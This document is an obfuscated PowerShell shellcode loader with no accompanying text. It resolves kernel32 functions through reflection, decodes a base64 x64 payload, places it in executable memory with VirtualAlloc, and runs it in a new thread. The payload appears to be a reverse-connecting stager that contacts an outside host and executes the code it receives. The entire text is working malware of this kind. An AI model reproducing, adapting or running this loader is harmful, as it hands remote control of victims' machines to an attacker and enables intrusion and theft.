function lAhX8 {
	Param ($wBjS, $w9hxh)		
	$iD = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $iD.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($iD.GetMethod('GetModuleHandle')).Invoke($null, @($wBjS)))), $w9hxh))
}

function rz {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $vFVA,
		[Parameter(Position = 1)] [Type] $vfG = [Void]
	)
	
	$wU = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$wU.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $vFVA).SetImplementationFlags('Runtime, Managed')
	$wU.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vfG, $vFVA).SetImplementationFlags('Runtime, Managed')
	
	return $wU.CreateType()
}

[Byte[]]$mlG = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVhIAdBeWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCADqZuZnFs0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2gfb4RACyTI2eAAEAAGpAQVloABAAAEFYSInySDHJQbpYpFPl/9VIjZgAAQAASYnfU1ZQTTHJSYnwSInaSIn5QboC2chf/9VIg8QgSAHDSCnGdeBJif5fWUFZQVboEAAAAJKLeqKLbGs3UHi3wNiHUmteSDHASYn4qv7AdftIMdtBAhwASInCgOIPAhwWQYoUAEGGFBhBiBQA/sB140gx2/7AQQIcAEGKFABBhhQYQYgUAEECFBhBihQQQTARSf/BSP/JddtfQf/n")
		
$bOWF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lAhX8 kernel32.dll VirtualAlloc), (rz @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $mlG.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($mlG, 0, $bOWF, $mlG.length)

$hah = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lAhX8 kernel32.dll CreateThread), (rz @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$bOWF,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lAhX8 kernel32.dll WaitForSingleObject), (rz @([IntPtr], [Int32]))).Invoke($hah,0xffffffff) | Out-Null